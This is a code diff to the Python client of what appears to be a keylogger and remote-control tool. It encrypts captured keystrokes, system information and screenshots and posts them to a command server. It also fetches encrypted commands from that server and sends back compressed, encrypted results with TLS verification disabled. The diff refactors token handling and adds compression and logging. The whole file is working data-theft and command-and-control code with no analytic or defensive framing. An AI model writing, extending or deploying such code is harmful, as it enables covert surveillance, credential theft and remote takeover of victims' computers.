@@ -3,12 +3,15 @@ import json
 import logging
 from config import Config
 import warnings
+import gzip
 warnings.filterwarnings("ignore", category=requests.packages.urllib3.exceptions.InsecureRequestWarning)
 
 class ServerCommunicator:
     def __init__(self, client_id, encryption_manager):
         self.client_id = client_id
         self.encryption = encryption_manager
+        self.server_url = Config.SERVER_URL
+        self.token = Config.SECRET_TOKEN
         logging.basicConfig(
             filename='errors.log',
             level=logging.INFO,
@@ -18,7 +21,7 @@ class ServerCommunicator:
     def _send_request(self, endpoint, data=None, files=None):
         try:
             endpoint = endpoint.lstrip('?/')
-            base_url = Config.SERVER_URL.rstrip('/')
+            base_url = self.server_url.rstrip('/')
             url = f"{base_url}/{endpoint}"
             logging.info(f"Sending request to {url} with data: {data}, files: {files is not None}")
             response = requests.post(
@@ -55,10 +58,9 @@ class ServerCommunicator:
 
     def upload_data(self, keystrokes, system_info, screenshot=None):
         try:
-            # Validate inputs
             if not keystrokes or not isinstance(keystrokes, list):
                 logging.warning("Keystrokes is empty or not a list")
-                keystrokes = ['']  # Default to empty string to avoid join error
+                keystrokes = ['']
             if not system_info or not isinstance(system_info, dict):
                 logging.warning("System_info is empty or not a dict")
                 system_info = {'error': 'No system info provided'}
@@ -68,7 +70,6 @@ class ServerCommunicator:
 
             logging.info(f"Preparing upload: client_id={self.client_id}, keystrokes_len={len(keystrokes_str)}, system_info_len={len(system_info_json)}")
 
-            # Encrypt data
             try:
                 encrypted_keystrokes = self.encryption.encrypt(keystrokes_str)
                 encrypted_system_info = self.encryption.encrypt(system_info_json)
@@ -83,7 +84,7 @@ class ServerCommunicator:
             encrypted_data = {
                 "action": "upload_data",
                 "client_id": self.client_id,
-                "token": Config.SECRET_TOKEN,
+                "token": self.token,
                 "keystrokes": encrypted_keystrokes,
                 "system_info": encrypted_system_info
             }
@@ -96,7 +97,7 @@ class ServerCommunicator:
             logging.info(f"Sending upload_data: {encrypted_data}, files: {files is not None}")
 
             response = requests.post(
-                Config.SERVER_URL,
+                self.server_url,
                 data=encrypted_data,
                 files=files,
                 timeout=Config.COMMAND_TIMEOUT,
@@ -118,14 +119,14 @@ class ServerCommunicator:
         try:
             logging.info("Fetching commands...")
             response = self._send_request(
-                "?action=get_commands",
+                "action=get_commands",
                 data={
                     "action": "get_commands",
                     "client_id": self.client_id,
-                    "token": Config.SECRET_TOKEN
+                    "token": self.token
                 }
             )
-            logging.info(f"Received {len(response)} commands")
+            logging.info(f"Raw commands received: {response}")
             validated_commands = []
             for cmd in response:
                 if not all(k in cmd for k in ('id', 'command')):
@@ -133,7 +134,9 @@ class ServerCommunicator:
                     continue
                 try:
                     decrypted = self.encryption.decrypt(cmd['command'])
+                    logging.info(f"Decrypted command: {decrypted}")
                     command_data = json.loads(decrypted)
+                    logging.info(f"Parsed command data: {command_data}")
                     if 'type' not in command_data:
                         logging.error(f"Command missing 'type': {command_data}")
                         continue
@@ -141,21 +144,40 @@ class ServerCommunicator:
                     validated_commands.append(cmd)
                 except Exception as e:
                     logging.error(f"Command validation failed: {str(e)}, command={cmd}")
+            logging.info(f"Validated commands: {validated_commands}")
             return validated_commands
         except Exception as e:
             logging.error(f"Failed to fetch commands: {str(e)}")
             raise CommunicationError(f"Failed to process commands: {str(e)}")
 
-    def send_command_result(self, command_id, result):
-        logging.info(f"Sending command result for ID {command_id}: {result}")
-        return self._send_request(
-            "command_response",
-            data={
-                "command_id": command_id,
-                "result": self.encryption.encrypt(json.dumps(result)),
-                "token": Config.SECRET_TOKEN
-            }
-        )
 
+    def send_command_result(self, command_id, result):
+        try:
+            logging.info(f"Sending command result for command_id: {command_id}")
+            # فشرده‌سازی نتیجه
+            compressed_result = gzip.compress(json.dumps(result).encode())
+            encrypted_result = self.encryption.encrypt(base64.b64encode(compressed_result).decode())
+            logging.info(f"Encrypted result: {encrypted_result[:50]}...")
+            data = {
+                'action': 'command_response',
+                'client_id': self.client_id,
+                'command_id': str(command_id),
+                'result': encrypted_result,
+                'token': self.token
+            }
+            response = requests.post(
+                f"{self.server_url}/action=command_response",
+                json=data,
+                headers={'Content-Type': 'application/json'},
+                verify=False,
+                timeout=Config.COMMAND_TIMEOUT
+            )
+            response.raise_for_status()
+            result_data = response.json()
+            logging.info(f"Received response: status={response.status_code}, text={response.text}")
+            return result_data
+        except Exception as e:
+            logging.error(f"Failed to send command result: {str(e)}")
+            raise CommunicationError(f"Failed to send command result: {str(e)}")
 class CommunicationError(Exception):
     pass
